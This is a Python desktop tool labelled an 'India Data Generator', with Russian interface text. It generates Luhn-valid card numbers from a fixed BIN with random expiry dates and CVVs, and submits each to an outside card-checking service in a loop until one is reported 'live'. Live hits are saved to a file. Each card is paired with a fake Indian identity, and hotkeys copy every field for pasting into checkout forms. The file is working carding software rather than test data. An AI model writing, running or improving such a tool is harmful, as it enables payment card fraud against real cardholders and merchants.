# -*- coding: utf-8 -*-
"""
Generator window for India data.
"""

import tkinter as tk
import random
import pyperclip
import threading
import requests
import time
from datetime import datetime
from faker import Faker

from .themes import THEMES
from .hotkey_settings import HotkeySettings, show_settings_window
from .live_cards_pool import get_live_card_from_pool


def show_in_window(parent, theme_name="light"):
    """Открывает окно с генератором данных для Индии."""
    win = tk.Toplevel(parent)
    win.title("India Data Generator")
    win.geometry("500x650")

    colors = THEMES[theme_name]
    accent_bg = colors.get("accent", "#2563eb")
    accent_fg = colors.get("accent_fg", colors["fg"])
    win.config(bg=colors["bg"])

    # Основной контейнер
    content_frame = tk.Frame(win, bg=colors["bg"])
    content_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

    fake_in = Faker("en_IN")
    lbl_font = ("Arial", 10, "bold")
    val_font = ("Arial", 10)

    content_frame.columnconfigure(1, weight=1)

    # StringVars for data
    card_val = tk.StringVar()
    exp_val = tk.StringVar()
    cvv_val = tk.StringVar()
    name_val = tk.StringVar()
    city_val = tk.StringVar()
    street_val = tk.StringVar()
    postcode_val = tk.StringVar()
    addr_en_val = tk.StringVar()

    def generate_luhn_number(bin_number):
        digits = [int(d) for d in str(bin_number)]
        while len(digits) < 15:
            digits.append(random.randint(0, 9))

        sum_ = 0
        for i, digit in enumerate(reversed(digits)):
            if i % 2 == 0:
                digit *= 2
                if digit > 9:
                    digit -= 9
            sum_ += digit
        check_digit = (10 - (sum_ % 10)) % 10
        digits.append(check_digit)
        return "".join(map(str, digits))

    def generate_virtual_card(bin_val):
        number = generate_luhn_number(bin_val)
        month = f"{random.randint(1, 12):02d}"
        year = random.randint(2025, 2030)
        cvv = f"{random.randint(100, 999)}"
        return number, month, year, cvv

    def check_card(card_details):
        url = "https://api.chkr.cc/"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        payload = {"data": card_details}
        try:
            response = requests.post(url, headers=headers, json=payload, timeout=15)
            if response.status_code == 200:
                return response.json()
            return None
        except:
            return None

    def generate_eng_address():
        cities = [
            "Mumbai",
            "Delhi",
            "Bangalore",
            "Hyderabad",
            "Chennai",
            "Kolkata",
            "Pune",
            "Ahmedabad",
        ]
        areas = [
            "Andheri",
            "Bandra",
            "Connaught Place",
            "Koramangala",
            "Jubilee Hills",
            "T Nagar",
            "Salt Lake",
            "Viman Nagar",
        ]
        streets = [
            "MG Road",
            "Park Street",
            "Brigade Road",
            "Anna Salai",
            "FC Road",
            "SV Road",
            "Link Road",
            "Station Road",
        ]
        city = random.choice(cities)
        area = random.choice(areas)
        street = random.choice(streets)
        bldg = random.randint(1, 999)
        return f"{bldg}, {street}, {area}, {city}, India"

    is_searching = False
    stop_event = threading.Event()

    def search_live_card_thread(bin_val):
        nonlocal is_searching
        attempt = 0
        while not stop_event.is_set():
            attempt += 1
            number, month, year, cvv = generate_virtual_card(bin_val)
            card_details = f"{number}|{month}|{year}|{cvv}"
            
            # Обновление UI: пока идем поиск
            def update_status(att, c_det):
                card_val.set(f"Ищем [{att}]...")
                exp_val.set(c_det)
                cvv_val.set("...")
            
            win.after(0, update_status, attempt, card_details)
            
            result = check_card(card_details)
            if result and isinstance(result, dict):
                status = result.get('status', '').lower()
                msg = result.get('message', '')
                if status == "live":
                    # Нашли карту!
                    def found_card(n, m, y, c):
                        card_val.set(n)
                        exp_val.set(f"{m}/{str(y)[-2:]}")
                        cvv_val.set(c)
                        toggle_search_btn(False)
                    win.after(0, found_card, number, month, year, cvv)
                    
                    # Сохраняем в файл
                    try:
                        with open("found_live.txt", "a", encoding="utf-8") as f:
                            f.write(f"{card_details} | {msg} | {time.ctime()}\n")
                    except:
                        pass
                    
                    break
            
            time.sleep(1)
        
        if is_searching: # if loop ended normally without unsetting is_searching
            win.after(0, lambda: toggle_search_btn(False))

    def toggle_search_btn(searching):
        nonlocal is_searching
        is_searching = searching
        if searching:
            generate_btn.config(text="⏹ Остановить", bg="#dc2626", fg="white")
        else:
            generate_btn.config(text="🔄 Сгенерировать", bg=accent_bg, fg=accent_fg)

    def refresh_data():
        nonlocal is_searching
        if is_searching:
            stop_event.set()
            toggle_search_btn(False)
            return

        pooled_card = get_live_card_from_pool("55182706")

        name_val.set(fake_in.name())
        city_val.set(fake_in.city())
        street_val.set(f"{fake_in.street_name()} {fake_in.building_number()}")
        postcode_val.set(fake_in.postcode())
        addr_en_val.set(generate_eng_address())
        
        if pooled_card:
            parts = pooled_card.split('|')
            if len(parts) >= 4:
                card_val.set(parts[0])
                exp_val.set(f"{parts[1]}/{str(parts[2])[-2:]}")
                cvv_val.set(parts[3])
                # We used a generated card instantly, no need to search
                return

        is_searching = True
        stop_event.clear()
        toggle_search_btn(True)

        # Start search thread with the prefix
        threading.Thread(target=search_live_card_thread, args=("55182706",), daemon=True).start()

    row_widgets = {}
    highlight_bg = "#f59e0b"
    default_label_bg = colors["bg"]
    default_entry_bg = colors["entry_bg"]
    default_label_fg = colors["fg"]
    default_entry_fg = colors["entry_fg"]
    cycle_keys = ["card", "exp_date", "cvv", "name", "city", "street", "postcode"]
    cycle_index = {"value": 0}

    def set_active_row(key):
        for row_key, widgets in row_widgets.items():
            is_active = row_key == key
            lbl = widgets["label"]
            entry = widgets["entry"]
            if is_active:
                lbl.config(bg=highlight_bg, fg=default_label_fg)
                entry.config(readonlybackground=highlight_bg, fg=default_entry_fg)
            else:
                lbl.config(bg=default_label_bg, fg=default_label_fg)
                entry.config(readonlybackground=default_entry_bg, fg=default_entry_fg)

    def copy_value(key):
        value = row_widgets[key]["value"]()
        if value:
            pyperclip.copy(value)
        set_active_row(key)

    def cycle_copy():
        key = cycle_keys[cycle_index["value"]]
        copy_value(key)
        cycle_index["value"] = (cycle_index["value"] + 1) % len(cycle_keys)

    def copy_to_clipboard(text):
        pyperclip.copy(text)

    # Hotkey copy functions
    def copy_card():
        copy_value("card")

    def copy_exp_date():
        copy_value("exp_date")

    def copy_cvv():
        copy_value("cvv")

    def copy_name():
        copy_value("name")

    def copy_city():
        copy_value("city")

    def copy_street():
        copy_value("street")

    def copy_postcode():
        copy_value("postcode")

    # Setup hotkeys
    hotkey_settings = HotkeySettings.get_instance()

    def on_settings_save(new_hotkeys):
        """Called when settings are saved."""
        hotkey_settings.register_all()

    def open_settings():
        show_settings_window(win, theme_name, on_save=on_settings_save)

    # Cleanup hotkeys when window is closed
    _in_window_keys = [
        "card",
        "exp_date",
        "cvv",
        "name",
        "city",
        "street",
        "postcode",
        "sk_cycle",
        "sk_close",
    ]

    def on_close():
        stop_event.set()
        for k in _in_window_keys:
            hotkey_settings._callbacks.pop(k, None)
        hotkey_settings.register_all()
        win.destroy()

    win.protocol("WM_DELETE_WINDOW", on_close)

    hotkey_settings.set_callback("card", copy_card)
    hotkey_settings.set_callback("exp_date", copy_exp_date)
    hotkey_settings.set_callback("cvv", copy_cvv)
    hotkey_settings.set_callback("name", copy_name)
    hotkey_settings.set_callback("city", copy_city)
    hotkey_settings.set_callback("street", copy_street)
    hotkey_settings.set_callback("postcode", copy_postcode)
    hotkey_settings.set_callback("sk_cycle", cycle_copy)
    hotkey_settings.set_callback("sk_close", on_close)
    hotkey_settings.register_all()

    def create_row(parent_frame, label_text, variable, row, copy_func=None):
        lbl = tk.Label(
            parent_frame,
            text=label_text,
            font=lbl_font,
            anchor="w",
            bg=colors["bg"],
            fg=colors["fg"],
        )
        lbl.grid(row=row, column=0, padx=10, pady=(10, 0), sticky="w")

        e = tk.Entry(
            parent_frame,
            textvariable=variable,
            font=val_font,
            state="readonly",
            readonlybackground=colors["entry_bg"],
            fg=colors["entry_fg"],
        )
        e.grid(row=row + 1, column=0, columnspan=2, padx=10, pady=(0, 5), sticky="ew")

        btn_bg = colors["btn_bg"]
        btn_fg = colors["btn_fg"]
        if copy_func:
            tk.Button(
                parent_frame,
                text="Copy",
                command=copy_func,
                width=6,
                bg=btn_bg,
                fg=btn_fg,
            ).grid(row=row + 1, column=2, padx=5, pady=(0, 5))
        else:
            tk.Button(
                parent_frame,
                text="Copy",
                command=lambda: copy_to_clipboard(variable.get()),
                width=6,
                bg=btn_bg,
                fg=btn_fg,
            ).grid(row=row + 1, column=2, padx=5, pady=(0, 5))
        return lbl, e

    r = 0
    lbl, entry = create_row(content_frame, "Номер карты:", card_val, r, copy_card)
    row_widgets["card"] = {"label": lbl, "entry": entry, "value": card_val.get}
    r += 2

    lbl, entry = create_row(
        content_frame, "Expiration Date:", exp_val, r, copy_exp_date
    )
    row_widgets["exp_date"] = {"label": lbl, "entry": entry, "value": exp_val.get}
    r += 2

    lbl, entry = create_row(content_frame, "CVV:", cvv_val, r, copy_cvv)
    row_widgets["cvv"] = {"label": lbl, "entry": entry, "value": cvv_val.get}
    r += 2

    lbl, entry = create_row(content_frame, "Имя (Name):", name_val, r, copy_name)
    row_widgets["name"] = {"label": lbl, "entry": entry, "value": name_val.get}
    r += 2

    lbl, entry = create_row(content_frame, "Город (City):", city_val, r, copy_city)
    row_widgets["city"] = {"label": lbl, "entry": entry, "value": city_val.get}
    r += 2

    lbl, entry = create_row(
        content_frame, "Улица (Street):", street_val, r, copy_street
    )
    row_widgets["street"] = {"label": lbl, "entry": entry, "value": street_val.get}
    r += 2

    lbl, entry = create_row(
        content_frame, "Индекс (Postcode):", postcode_val, r, copy_postcode
    )
    row_widgets["postcode"] = {"label": lbl, "entry": entry, "value": postcode_val.get}
    r += 2

    create_row(content_frame, "Address (English):", addr_en_val, r)
    r += 2

    btn_frame_win = tk.Frame(content_frame, bg=colors["bg"])
    btn_frame_win.grid(row=r, column=0, columnspan=3, pady=20)

    generate_btn = tk.Button(
        btn_frame_win,
        text="🔄 Сгенерировать",
        command=refresh_data,
        bg=accent_bg,
        fg=accent_fg,
        font=("Arial", 10, "bold"),
        padx=10,
    )
    generate_btn.pack(side=tk.LEFT, padx=5)

    tk.Button(
        btn_frame_win,
        text="⚙ Настройки",
        command=open_settings,
        bg=colors["btn_bg"],
        fg=colors["btn_fg"],
        font=("Arial", 10),
        padx=10,
    ).pack(side=tk.LEFT, padx=5)

    # Hotkey hint
    r += 1
    extra_color = "#aaa" if theme_name == "dark" else "#555"
    hotkeys = hotkey_settings.get_hotkeys()
    hint_text = (
        f"Горячие клавиши: Следующее={hotkeys.get('sk_cycle', '-')}, "
        f"Закрыть={hotkeys.get('sk_close', '-')}, "
        f"Карта={hotkeys.get('card', '-')}, "
        f"Имя={hotkeys.get('name', '-')}, "
        f"Город={hotkeys.get('city', '-')}"
    )
    hint_lbl = tk.Label(
        content_frame,
        text=hint_text,
        font=("Arial", 8),
        fg=extra_color,
        bg=colors["bg"],
    )
    hint_lbl.grid(row=r, column=0, columnspan=3, pady=(0, 10))

    refresh_data()
    cycle_index["value"] = 0
